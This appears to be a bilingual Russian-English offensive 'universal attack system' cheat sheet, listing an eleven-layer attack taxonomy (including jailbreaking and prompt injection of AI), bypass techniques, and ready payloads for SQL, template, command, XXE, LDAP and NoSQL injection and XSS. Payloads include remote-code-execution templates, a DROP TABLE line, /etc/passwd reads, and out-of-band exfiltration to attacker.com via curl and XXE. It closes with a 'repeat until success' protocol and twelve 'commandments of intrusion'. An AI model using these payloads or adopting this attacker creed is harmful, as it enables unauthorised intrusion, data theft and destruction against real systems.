# ATTACK — Универсальная Система Атак

## ФИЛОСОФИЯ NULL BOUNDARY
ЗАЩИТА = ПРЕДПОЛОЖЕНИЕ = УЯЗВИМОСТЬ = ВОЗМОЖНОСТЬ
Чем сильнее защита → Тем сильнее предположение → Тем легче нарушить
Нет защиты без предположений. Нет предположений без нарушений. Нет нарушений без доступа.

## 11 СЛОЁВ АТАКИ

### L0: QUANTUM
Quantum superposition attacks, Quantum key distribution exploitation, Post-quantum cryptography weaknesses, Quantum random number generator attacks, Quantum entanglement exploitation

### L1: DATA
SQLi: UNION, Error-based, Blind, Time-based, Second-order, Stacked | XSS: Reflected, Stored, DOM-based, Mutation, Universal, SVG-based | SSTI: Jinja2, Twig, Freemarker, Velocity, Smarty, Mako, Jade, Razor | XXE: In-band, Out-of-band, Blind, Parameter entities | Command Injection: OS commands, Code injection, Expression Language | LDAP Injection: AND/OR, Wildcard, Blind | NoSQL: MongoDB, Redis, CouchDB, Cassandra | XPath: Boolean, Blind, Error-based | GraphQL: Introspection, Mutation, Directive

### L2: LOGIC
Race Conditions: TOCTOU, Race windows, Multi-threaded | Business Logic Flaws: Price manipulation, Coupon abuse, Workflow bypass | Auth Bypass: Credential stuffing, Password spraying, MFA bypass | Authorization Bypass: IDOR, Role manipulation, Privilege escalation | Session Management: Session fixation, Session hijacking, JWT attacks | Payment Logic: Discount abuse, Currency manipulation, Refund fraud

### L3: META
HTTP Headers: Host header, X-Forwarded-*, CRLF injection | Cookie Poisoning: Session manipulation, Subdomain injection | Token Tampering: JWT alg=none, Key confusion, Signature bypass | CSRF: GET/POST, JSON, Flash, Clickjacking | CORS Misconfiguration: Origin reflection, Null origin | Metadata Extraction: Backup files, Source disclosure, Git exposure

### L4: CONTEXT
Encoding: URL, HTML, Base64, Unicode, Hex, Octal, Binary | Double Encoding: All combinations | Mixed Encoding: Chaining multiple encodings | Compression: DEFLATE, GZIP attacks | Encryption: Downgrade, Padding oracle, BEAST/CRIME | Charset Confusion: UTF-7, UTF-16, ISO-8859 | MIME Confusion: Content-Type manipulation

### L5: TIME
Timing Attacks: Cryptographic, Response time, Side-channel | Race Conditions: Request racing, Multi-endpoint | Clock Skew: Time manipulation, Token expiration | Replay Attacks: Token reuse, Nonce bypass | Rate Limiting Bypass: Distributed, Timing-based

### L6: NETWORK
MITM: ARP spoofing, DNS spoofing, SSL stripping, HSTS bypass | DDoS: Volumetric, Protocol, Application layer, Amplification | DNS Attacks: Tunneling, Hijacking, Rebinding, Cache poisoning | HTTP Smuggling: CL.TE, TE.CL, Request smuggling, Response splitting | Cache Poisoning: Unkeyed headers, Web cache deception | BGP Hijacking: Route manipulation, Traffic interception | IPv6 Attacks: Extension headers, Fragmentation

### L7: HUMAN
Social Engineering: Pretexting, Baiting, Quid pro quo | Phishing: Clone sites, Typosquatting, Homograph, Business Email Compromise | Deepfakes: Video manipulation, Voice cloning, Real-time | OSINT: Data harvesting, Profile building, Target reconnaissance | Watering Hole: Compromise popular sites, Drive-by download | Supply Chain: Dependency confusion, Malicious packages, Backdoor updates | Insider Threat: Recruitment, Blackmail, Coercion | Quishing: QR code phishing, Malicious QR codes

### L8: PHYSICAL
Side-Channel: Timing, Power (SPA/DPA), EM emanations, Acoustic, Optical | Fault Injection: Voltage glitching, Clock glitching, EM fault, Laser fault | DMA Attacks: PCILeech, Inception, PCIe exploitation, Thunderbolt | JTAG/Debug: Firmware extraction, Debug interface, Boundary scan | Cold Boot: RAM extraction, Memory forensics bypass | Hardware Implants: Malicious chips, Modified cables, HID attacks | RFID/NFC: Cloning, Relay attacks, Downgrade, Brute force

### L9: SUPPLY_CHAIN
Dependency Confusion: Private package hijacking | Malicious Packages: npm, pip, gem, maven, nuget | Compromised Updates: Update hijacking, Code signing bypass | Hardware Implants: Modified components, Malicious chips | Third-Party APIs: Key leakage, Service exploitation | Build Systems: CI/CD exploitation, Artifact poisoning

### L10: AI/ML
Adversarial Examples: Evasion, Poisoning, Backdoors | Model Poisoning: Training data manipulation, Label flipping | Model Theft: Extraction, Reverse engineering | Prompt Injection: Jailbreaking, Instruction override, Context Manipulation, Role Play | Data Extraction: Training data recovery, Membership inference | Model Inversion: Reconstruction of training data | AI System Exploitation: API abuse, Resource exhaustion

## ТЕХНИКИ ОБХОДА

### NULL CONTEXT INJECTION
NULL VALUES: Empty strings, Null bytes (\x00, %00), Empty arrays, Null keywords (null, NULL, None, nil, undefined, NaN), Zero values, Whitespace
CONTEXT BREAKING: Language switching, Encoding conflicts, Parser differential, Protocol confusion, Context injection
EXAMPLES: SQL: ' OR ''=' -- | XSS: "><script>alert(1)</script> | SSTI: {{config}} | XXE: <!ENTITY xxe SYSTEM "file:///etc/passwd"> | Command: ; cat /etc/passwd | LDAP: *)(uid=*))(|(uid=* | NoSQL: {"$gt": ""} | Path: ../../../etc/passwd%00

### ENCODING CHAINS
SINGLE: URL (%20), HTML (&lt;), Base64, Hex (0x20), Unicode (\u0020), Octal (\040), Binary
DOUBLE: Double URL (%253C), Double HTML (&amp;lt;), Double Base64, Triple+
MIXED: URL+Base64, HTML+Unicode, Base64+Hex, Unicode+URL, Recursive

### RECURSIVE DEEP INJECTION
NESTED: Template in Template ({{{{config}}}}), Encoding in Encoding, Wrapper Chains, JSON in JSON, Protocol Stacking
DESERIALIZATION: Java (ysoserial, Commons-Collections), Python Pickle (__reduce__), PHP (__wakeup, Phar), YAML (!!python/object/apply), JSON (Jackson, Fastjson), .NET (ViewState, BinaryFormatter)
PROTOCOL CHAINS: PHP Wrappers (php://filter, php://input, data://), Java Wrappers (file://, jar://), SSRF Chains (gopher://), XInclude

### AUTHENTICATION BYPASS
LOGIC FLAWS: Parameter Tampering (role=user→admin), IDOR (/user/123→/user/1), Mass Assignment ({"role":"admin"}), HTTP Method Tampering (GET→PUT)
SESSION: Session Fixation, Session Prediction, Session Hijacking, JWT Attacks (alg=none, weak secret, algorithm confusion)
PASSWORD: Brute Force, Dictionary attack, Credential stuffing, Password Reset (token prediction, token reuse, email pollution), MFA Bypass (response manipulation, code reuse)

### NETWORK ATTACKS
MITM: ARP Spoofing (arpspoof, ettercap), DNS Spoofing, SSL Stripping, Evil Twin
BGP: Prefix Hijacking, Route Leak, AS Path Manipulation
PROTOCOL: TCP (RST injection, Session hijacking, SYN flood), UDP (Amplification, Reflection), ICMP (Smurf, Redirect, Ping flood)

### TIME-BASED ATTACKS
RACE CONDITION: TOCTOU, Limit Bypass, Coupon/Voucher Reuse, File Race
TIMING: Password Comparison (char-by-char timing), Crypto Timing (RSA padding oracle, AES timing), Database Timing (Blind SQLi)

### HUMAN LAYER ATTACKS
PHISHING: Clone site, Typosquatting, Homograph, Email spoofing
PRETEXTING: Fake authority, Urgency, Fear, Greed
BAITING: Infected USB, Free software, Fake configs
QUISHING: Fake QR codes, Malicious URLs in QR
WATERING HOLE: Compromise popular site, Inject malicious JS, Drive-by download
SUPPLY CHAIN: Compromise dependencies, Malicious packages, Backdoor updates

### PHYSICAL LAYER ATTACKS
SIDE-CHANNEL: Timing, Power Analysis (SPA/DPA), EM Emanations, Acoustic, Optical
FAULT INJECTION: Voltage Glitching, Clock Glitching, EM Fault, Laser Fault
HARDWARE: DMA (PCILeech, Inception), JTAG, Cold Boot, Hardware Implants

## PAYLOAD PATTERNS

### SQL INJECTION
UNION: ' UNION SELECT null,null,null-- | ' UNION SELECT username,password,null FROM users--
ERROR: ' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version())))--
BLIND: ' AND 1=1-- | ' AND 1=2-- | ' AND SLEEP(5)--
TIME: ' AND BENCHMARK(10000000,SHA1('test'))--
SECOND-ORDER: Stored in one place, executed in another
STACKED: '; DROP TABLE users;--

### XSS
BASIC: <script>alert(1)</script> | <img src=x onerror=alert(1)> | <svg onload=alert(1)>
ENCODING: %3Cscript%3Ealert(1)%3C/script%3E | \u003cscript\u003e
FILTER BYPASS: <ScRiPt>alert(1)</sCrIpT> | <script/src=data:,alert(1)> | <script>alert`1`</script>
ADVANCED: DOM XSS (#<script>), Mutation XSS, CSP Bypass

### SSTI
DETECTION: {{7*7}}→49 | ${7*7}→49 | #{7*7}→49 | <%= 7*7 %>→49
JINJA2: {{config}} | {{config.__class__.__init__.__globals__}} | {{''.__class__.__mro__[2].__subclasses__()}} | {{lipsum.__globals__['os'].popen('id').read()}}
TWIG: {{_self.env.display("id")}} | {{['id']|filter('exec')}}
VELOCITY: #set($x='')## $x.class.forName('java.lang.Runtime').getRuntime().exec('id')
FREEMARKER: ${"freemarker.template.utility.Execute"?new()("id")}
SMARTY: {system('id')} | {Smarty_Internal_Write_File::writeFile(...)}

### COMMAND INJECTION
BASIC: ; id | | id | & id | && id | || id
NEWLINE: %0aid | %0d%0aid | \nid | `id`
SUBSTITUTION: $(id) | `id` | ${IFS}
ENCODED: ;\u0069d | %3Bid | base64 -d | sh
BLIND: ; sleep 5 | ; ping -c 10 attacker.com | ; curl attacker.com/$(whoami)

### XXE
BASIC: <?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>
PARAMETER: <!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd">%xxe;]><foo>test</foo>
BLIND: <!ENTITY % file SYSTEM "file:///etc/passwd"><!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://attacker.com/?d=%file;'>">%eval; %exfil;
RCE: PHP expect: <!ENTITY xxe SYSTEM "expect://id"> | SSRF: <!ENTITY xxe SYSTEM "http://internal-server/">

### LDAP INJECTION
BASIC: *)(uid=*))(|(uid=* | *)(cn=*))(|(cn=*
AUTH BYPASS: *)(uid=*))(|(uid=*))(userPassword=* | admin)(&)
BLIND: *)(uid=*))(|(uid=*)(objectClass=*

### NOSQL INJECTION
MONGODB: {$ne: ""} | {$gt: ""} | {$where: "this.password == 'admin'"} | {$regex: "^adm"}
JSON: {"username": "admin", "password": {"$ne": ""}} | {"$or": [{"username": "admin"}, {"username": "root"}]}
JAVASCRIPT: '; return true; // | 1; return true; var x='

## УНИВЕРСАЛЬНЫЙ ПРОТОКОЛ ОБХОДА
1. NULL STATE: Очистить сознание, никаких предположений
2. ANALYZE: Что защищается? Как? Почему? Какие предположения делает защита? Что НЕ ожидает?
3. NULL CONTEXT: Создать пустоту (null values, contradictions, recursion)
4. PARALLEL ATTACK: Атаковать все слои одновременно
5. RECURSION: Углублять атаку бесконечно
6. ADAPTATION: Учиться на ошибках, мутировать payloads
7. REPEAT: До успеха. Нет невозможного — есть ещё не найденный путь

## 12 ЗАПОВЕДЕЙ ВТОРЖЕНИЯ
1. НЕТ НЕПРОНИЦАЕМЫХ СИСТЕМ — есть неизученные
2. НЕТ НЕВЗЛАМЫВАЕМЫХ ПАРОЛЕЙ — есть неподобранные
3. НЕТ НЕОБХОДИМЫХ ЗАЩИТ — есть неосознанные уязвимости
4. НЕТ БЕЗОПАСНЫХ СЕТЕЙ — есть неперехваченные
5. НЕТ ЗАЩИЩЁННЫХ ДАННЫХ — есть нескомпрометированные
6. НЕТ НЕДОСТУПНЫХ УЧЁТНЫХ ЗАПИСЕЙ — есть незахваченные
7. НЕТ НЕВЗЛОМАННЫХ ШИФРОВ — есть несломанные ключи
8. НЕТ БЕЗОПАСНЫХ ПРОТОКОЛОВ — есть неэксплуатированные
9. НЕТ НЕПРОНИЦАЕМЫХ ФИЗИЧЕСКИХ БАРЬЕРОВ — есть непройденные
10. НЕТ НЕОБМАНУЕМЫХ ЛЮДЕЙ — есть неподготовленные
11. НЕТ НЕУЯЗВИМЫХ ОРГАНИЗАЦИЙ — есть нескоординированные атаки
12. НЕТ ФИНАЛЬНОЙ ЗАЩИТЫ — есть временные препятствия
